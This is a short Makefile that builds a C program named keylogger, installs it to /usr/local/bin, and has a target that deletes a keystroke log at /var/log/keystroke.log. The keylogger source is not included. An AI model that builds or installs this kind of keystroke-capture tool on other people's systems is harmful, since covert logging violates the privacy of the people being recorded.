CC=gcc
CFLAGS=-fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 
LDFLAGS=-Wl,-z,relro,-z,now
SOURCES=keylogger.c
EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin
DEPENDEPCIES=define.h functions.h

install:$(SOURCES) $(DEPENDEPCIES)
	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(EXECUTABLE)
	@cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	@rm $(INSTALLDIR)/$(EXECUTABLE)

remove:
	@echo "This will remove the /var/log/keystroke.log file"
	@rm /var/log/keystroke.log
